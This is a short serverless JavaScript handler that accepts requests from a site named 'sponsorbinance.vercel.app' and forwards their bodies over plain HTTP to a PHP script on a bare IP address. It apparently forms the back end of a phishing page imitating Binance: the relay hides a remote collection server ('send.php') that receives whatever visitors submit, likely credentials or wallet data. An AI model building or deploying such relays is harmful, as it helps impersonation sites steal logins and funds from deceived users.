export default async function handler(req, res) {
    res.setHeader("Access-Control-Allow-Origin", "https://sponsorbinance.vercel.app");
    res.setHeader("Access-Control-Allow-Credentials", "true");
    res.setHeader("Access-Control-Allow-Methods", "POST, GET, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");

    if (req.method === "OPTIONS") {
        res.status(200).end();
        return;
    }

    try {
        const response = await fetch("http://104.194.133.124/send.php", {
            method: req.method,
            headers: {
                "Content-Type": "application/json",
            },
            body: req.method === "POST" ? JSON.stringify(req.body) : undefined,
        });

        const data = await response.text();
        res.status(response.status).send(data);
    } catch (error) {
        console.error("❌ Proxy Error:", error);
        res.status(500).json({ error: "Proxy request failed" });
    }
}

export const config = {
    api: {
        bodyParser: true,
    },
};
